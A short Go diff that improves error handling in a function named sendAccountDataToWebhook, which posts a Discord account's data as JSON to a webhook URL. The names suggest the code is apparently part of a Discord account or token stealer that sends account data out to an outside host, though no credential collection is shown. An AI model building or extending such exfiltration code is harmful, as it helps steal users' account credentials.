@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"net/http"
@@ -111,11 +112,12 @@ func sendAccountDataToWebhook(account DiscordAccount, webhookUrl string) (err er
 
 	// Create JSON payload from our webhook structure we created
 	jsonPayload, err := json.Marshal(payload)
-		if err != nil {return fmt.Errorf("could not marshal webhook payload to JSON")}
+		if err != nil {return fmt.Errorf("could not marshal webhook payload to JSON. msg: %v", err.Error())}
 
 	// Send HTTP POST request to Discord webhook URL
 	response, err := http.Post(webhookUrl, "application/json", bytes.NewBuffer(jsonPayload))
-		if err != nil {return fmt.Errorf("could not post webhook data")}
+		if webhookUrl == "" {return errors.New("webhookUrl is not set")}
+		if err != nil {return fmt.Errorf("could not post to webhook. msg: %v", err.Error())}
 	defer response.Body.Close()
 
 	// Check response status - assuming anything in 200-399 is fine. Normally returns a 204 upon success 
